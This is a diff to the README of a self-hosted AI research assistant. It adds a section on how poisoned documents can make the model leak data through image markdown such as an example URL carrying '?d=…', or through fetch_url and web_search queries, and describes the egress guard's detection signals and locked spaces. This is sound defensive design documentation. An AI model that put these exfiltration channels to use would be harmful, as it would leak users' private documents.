@@ -32,6 +32,8 @@ through a single Bun process.
     - [Library upload (persistent)](#library-upload-persistent-vector-searchable)
     - [URL and YouTube ingestion](#url-and-youtube-ingestion)
   - [URL fetching](#url-fetching)
+  - [Preventing data exfiltration](#preventing-data-exfiltration)
+    - [Locked spaces](#locked-spaces)
   - [Prompt templates](#prompt-templates)
     - [Prompt Studio](#prompt-studio)
   - [Settings](#settings)
@@ -239,7 +241,9 @@ There are three ways to bring file content into a conversation.
 Click the **paperclip** icon next to the message box and pick a file. The file is sent to
 the server, its text is extracted (PDF text layer, OCR for images, plain text for
 everything else), and up to the configured character limit (default 20 000, ~5 000 tokens) of that text are injected into the message
-you are about to send. The file is **not stored** — it lives only in that one message.
+you are about to send. The file itself is **not stored** and never enters the library — but the
+message is saved with the chat like any other, so the extracted text is part of that conversation.
+In a space it is also indexed for chat-history search, once, on the turn you attach it.
 
 The character limit is configurable in **Admin > System settings > Attachments**.
 
@@ -262,6 +266,14 @@ In balanced and thorough modes, if you have files in your library, relevant exce
 explicitly.
 
 The library is useful for building a personal knowledge base of PDFs, notes, or research papers that the assistant can draw on across many conversations.
+
+Note the difference from a **chat attachment**: a library file is only ever surfaced as retrieved
+excerpts, so it suits knowledge you want available across conversations. When you want to discuss a
+document *as a whole*, attach it to the message instead — the full text then goes into the model's
+context. An attachment is embedded once, on the turn you attach it, so this costs nothing extra on
+subsequent turns.
+
+Deleting a file removes its chunks and embeddings with it.
 
 Max upload size: 50 MB.
 
@@ -293,6 +305,98 @@ There are two ways page content reaches the model, and they share the same fetch
 - **Timeout** — each attempt is capped at `FETCH_TIMEOUT_MS` (default 10 s), applied separately to the static fetch and to the Playwright render, so an unreachable page costs at most roughly double that before the model is told it failed.
 - **Cache** — fetched URLs are cached for 5 minutes so the model does not re-fetch during the same session.
 - **Privacy** — by default requests originate from the server's IP. Set `FETCH_PROXY_URL` to route all fetches through an HTTP or SOCKS5 proxy (e.g. [Privoxy](https://www.privoxy.org/) → Tor).
+
+---
+
+## Preventing data exfiltration
+
+Once the assistant has read a document you gave it, anything it can send outwards is a way for that
+document to leave. This is not only a question of trusting the model: a document or a web page can
+*contain instructions*, and an instruction-following model will follow them. Assume the content the
+model reads is hostile — a poisoned PDF is far likelier than a maliciously trained model, and both
+produce the same behaviour.
+
+There are three outbound channels, and they are not equally dangerous.
+
+**1. Images in the answer — closed.** An answer containing `![](https://somewhere/x?d=…)` is
+rendered as an ordinary image, so the browser fetches it the moment the answer appears: no tool
+call, nothing in the activity log, and no server-side check involved. The
+`Content-Security-Policy` set by the app restricts images to Queriocity's own origin, which closes
+this off completely. Override with `CONTENT_SECURITY_POLICY` only if you know you need remote
+images, and understand that you are reopening this when you do.
+
+**2. `fetch_url`, and 3. `web_search`** — mitigated, not closed. Both send text the model chooses to
+a destination the model chooses. Note that the loopback/private-address blocking described above is
+a *different* protection: it stops fetches reaching inward, onto your LAN. It has nothing to say
+about a request going outward to a public host with your document's contents in the query string.
+
+`EGRESS_GUARD` scores each outbound request for signs of carrying data rather than asking for it:
+
+- an unbroken 32-character run mixing letters and digits — what an encoder emits, and what written
+  language never contains
+- heavy percent-encoding, or a URL far longer than the task needs
+- a destination host that appeared in no search result and in nothing you wrote, a bare IP, or a
+  hostname label long enough to be the payload itself
+- **terms from your own documents that you never mentioned** — the sharpest signal, because it asks
+  whether document content is leaving rather than guessing at the shape of a payload
+
+Above a threshold you are asked before the request is sent, with the full target shown. Declining is
+the default: the prompt refuses on its own after `EGRESS_APPROVAL_TIMEOUT_MS` (60 s), and also if you
+close the tab or stop the run. Monitors run with nobody watching, so a flagged request there is
+refused outright rather than waiting.
+
+**When it will ask you and needn't have.** Looking up a term found in one of your documents is both
+a completely normal request and exactly what exfiltrating that term looks like — the guard cannot
+tell them apart. So "what does *this* mean?" about something you just read, where you did not type
+the term yourself, is the case most likely to prompt unnecessarily. Approving is the right answer
+there; it is asking because the request is genuinely ambiguous, not because it has spotted an
+attack. The same goes for a URL the model guessed rather than took from a search result.
+
+**What this does not do.** Every signal keys on how a payload *looks*, so a patient attacker can
+leak a little at a time in ordinary-looking words and score nothing. Treat a clean run as "nothing
+obvious was spotted", never as proof nothing left. If a document genuinely must not leave the
+machine, use a **locked space** (below) rather than relying on this.
+
+Run `EGRESS_GUARD=log` first if you want to see what would have been flagged against your own usage
+before letting it act; `off` disables the checks.
+
+### Locked spaces
+
+Everything above is *detection* — it inspects each outbound request and judges it. A locked space is
+a *capability* control instead: `web_search` and `fetch_url` are never offered to the model, pasted
+URLs are not fetched, and image generation is refused. There is no request to judge, so there is
+nothing to tune and nothing to get wrong.
+
+Lock a space with the padlock beside its name in the sidebar. Every chat in it shows a lock, and the
+chat itself carries a banner for as long as it is open.
+
+**To analyse a sensitive document safely:**
+
+1. **Create a space and lock it first**, before putting anything in it.
+2. **Start a new chat inside that space.**
+3. **Attach the document to that chat**, using the paperclip.
+
+Step 3 matters as much as the others. A file added to your **library** is searchable from *every*
+chat you own, including online ones in other spaces — locking a space afterwards does not retract
+it. A chat attachment is ephemeral and never enters the library, so it exists only in the locked
+conversation.
+
+**Locking is close to one-way, by design.** While a space is empty you can unlock it freely. Once it
+holds a chat or a memory you cannot, because unlocking would hand web access to everything gathered
+under the promise that there was none. The same reasoning closes the other ways out, and all four
+are enforced on the server, not just hidden in the interface:
+
+- A chat in a locked space can only be moved to another locked space — not to an unlocked one, and
+  not out to no space at all.
+- Deleting a locked space **deletes its chats**, rather than releasing them as ordinary unlocked
+  chats. You are warned before this happens.
+- Monitors cannot be attached to a locked space, since a monitor is a scheduled web search.
+
+**The limit worth knowing.** A locked space removes the model's tools; it does not change where the
+model runs. If `CHAT_BASE_URL` (or `EMBED_BASE_URL` / `RERANK_BASE_URL`) points at a hosted API, your
+document is sent there in the very first request, before any tool could exist. Queriocity warns at
+startup when those endpoints are not local. For a document that must not leave your machine at all,
+the model server has to be on it.
 
 ---
 
@@ -484,10 +588,16 @@ Set `IMAGE_BASE_URL` in your environment to enable the feature (see [Environment
 - A persistent **memory store** — facts extracted from conversations, injected into future system prompts
 - A **chat history index** — full message content embedded for semantic retrieval
 - **Tagged files** — library documents linked to the space for contextual retrieval
+- An optional **lock** — see [Locked spaces](#locked-spaces): chats in a locked space get no web
+  search, URL fetching or image generation, for analysing something that must not leave the machine
 
 ### Assigning chats to spaces
 
 Chats can be assigned or reassigned to spaces from the chat header or space detail view. When a chat is first assigned to a space, memories are retroactively extracted and the chat history is indexed for RAG. Auto-extracted memories follow the chat if it is moved or removed.
+
+A chat in a **locked** space can only be moved to another locked space, and deleting a locked space
+deletes its chats rather than releasing them — otherwise either action would quietly hand web access
+back to a conversation that was analysed without it.
 
 ### RAG (retrieval-augmented generation)
 
@@ -672,6 +782,15 @@ SMALL_MODEL=qwen3.5-small
 # EMBED_API_KEY=                              # falls back to CHAT_API_KEY
 EMBED_MODEL=nomic-embed-text
 EMBED_DIMENSIONS=1536                       # must match the model's output size
+# EMBED_CONTEXT_TOKENS=1024                 # CAPACITY: your embedding server's context. Decides how
+#                                            # many chunks fit in one request; more = fewer round
+#                                            # trips during indexing, nothing else. 2048-4096 is
+#                                            # plenty — do not run it at 32k for this workload.
+# EMBED_MAX_INPUT_CHARS=2500                 # QUALITY: most of one string that becomes one vector.
+#                                            # ~600 tokens. Long passages average into vectors that
+#                                            # match everything weakly, so this stays small on
+#                                            # purpose; it bounds *queries*, which are never chunked.
+#                                            # Clamped to fit one request.
 
 # ── Reranker (optional) ───────────────────────────────────────────────────────
 # When RERANK_MODEL is set, a cross-encoder reranker reorders accumulated sources
@@ -779,6 +898,15 @@ JWT_SECRET=change-me-in-production-32chars!!
 #                                            # on the real client address instead of the proxy's.
 #                                            # Do NOT set when exposed directly — the header is
 #                                            # then client-forgeable.
+
+# ── Exfiltration controls (see "Preventing data exfiltration") ───────────────
+# CONTENT_SECURITY_POLICY=                   # replaces the app's default policy wholesale; empty
+#                                            # disables it. The default stops the browser loading
+#                                            # remote images out of an answer, which is otherwise a
+#                                            # silent way for conversation content to leave.
+# EGRESS_GUARD=enforce                       # screening of fetch_url URLs and web_search queries:
+#                                            # enforce | log (score and log only) | off
+# EGRESS_APPROVAL_TIMEOUT_MS=60000           # how long an approval prompt waits before refusing
 
 # ── Rate limits (per user, per minute; 0 disables one) ───────────────────────
 # RATE_LIMIT_CHAT_PER_MIN=30
@@ -1042,13 +1170,11 @@ user shares one login rate-limit bucket keyed on the proxy's own address. Nginx 
 sets that header itself, so the same applies there. Leave `COOKIE_SECURE` unset (it defaults
 to on) and `ALLOWED_ORIGIN` unset (same-origin only).
 
-A Content-Security-Policy is not set by the app, because an untested policy silently breaks
-KaTeX, syntax highlighting, or the service worker. To enable one, add it here and verify the
-browser console is clean before trusting it:
-
-```nginx
-    # add_header Content-Security-Policy "default-src 'self'; img-src 'self' data: blob:; style-src 'self' 'unsafe-inline'; font-src 'self' data:; connect-src 'self'; frame-ancestors 'none'" always;
-```
+**A Content-Security-Policy is set by the app itself**, so it applies whether or not you run a
+proxy — see [Preventing data exfiltration](#preventing-data-exfiltration) for what it is for. Do
+not add one here as well: two `Content-Security-Policy` headers are intersected by the browser, so
+a proxy-level copy can only break things the app already allows. Override it with the
+`CONTENT_SECURITY_POLICY` env var instead.
 
 ---
 
@@ -1194,6 +1320,7 @@ CHAT_MODEL=my-chat-model
 SMALL_MODEL=my-small-model
 EMBED_MODEL=my-embed-model
 EMBED_DIMENSIONS=1536               # match your embedding model's output size
+EMBED_CONTEXT_TOKENS=4096           # match the context your embedding server was started with
 
 # Optional: dedicated thinking model for thorough mode researcher phase
 THINKING_MODEL=my-think-model
@@ -1275,16 +1402,19 @@ The **Admin panel > System settings** tab exposes runtime-configurable parameter
 | Memory | Dream threshold | 1500 | Compaction triggers when space memory exceeds this many tokens |
 | Memory | Dream target | 700 | Token target after compaction |
 | Memory | Dream deep | Off | Re-extract memories from source conversations using the thinking model during the dream pass |
-| Memory | Extraction context | 6000 | Max characters of conversation fed to the small model when extracting memories |
+| Memory | Extraction context | 6000 | Max characters of conversation fed to the small model when extracting memories. Clamped to what `SMALL_MODEL_CONTEXT_TOKENS` allows — a larger value has no effect, and the panel says so |
+| Retrieval | Chunks per search | 15 | How many nearest chunks each vector search retrieves — document RAG, chat-history RAG, and the `uploads_search` / `search_space_history` tools. One value for all of them. Reranking prunes this list, so it is also the ceiling on what reranking can consider |
 | Reranking | Top N | 15 | Results kept after reranking (requires `RERANK_MODEL`). Applies to pre-search results in balanced and thorough, and to the accumulated sources handed to the thorough writer — lower it to shrink prompts, raise it to give the model more to work with |
 | Search | Query reformulation | On | Use a small LLM to rewrite queries before searching. Improves relevance at the cost of a small model call. Disable on slow hardware. |
 | Search | RSS feed character budget | 50000 | Total characters of news content fetched per monitor run when RSS sources are selected. Items per feed and content length per item scale automatically to fill this budget. Increase for large-context models; decrease for small ones (8K context ≈ 20 000 chars). |
 | Search | Max pages per URL | 8 | How many paginated pages to fetch when a user provides a URL (`?page=2`, `?page=3`…). 0 = unlimited. |
 | Search | Summarize oversized URL content | Off | Summarize fetched URL content that exceeds the context budget with the small model instead of hard-truncating. Adds latency. |
 | Context | Compress dropped history | Off | When a research turn's conversation history must be trimmed to fit the context budget, summarize the dropped messages with the small model instead of discarding them, folded into the system prompt. Adds latency; only applies to balanced/thorough turns. |
-| Attachments | Max context chars | 20000 | Max characters extracted from an attached file and sent as context |
+| Attachments | Max context chars | 20000 | Max characters extracted from an attached file and sent as context. The chat model receives all of it and the text is indexed for later search, but the *query* embedding for that turn uses only the first `EMBED_MAX_INPUT_CHARS` — a startup warning appears if you set this much higher |
 
-The **RAG context budget** field also has a **Re-index chats** button that queues a background re-index of all chat sessions across all users — useful after changing embedding models or dimensions.
+The **RAG context budget** field also has a **Re-index chats** button that queues a background
+re-index of all chat sessions across all users — useful after changing embedding models or
+dimensions, and the way to clear duplicate chunks left by regenerating answers on an older version.
 
 The **Users** tab lets admins manage accounts, roles, and invite links.
 
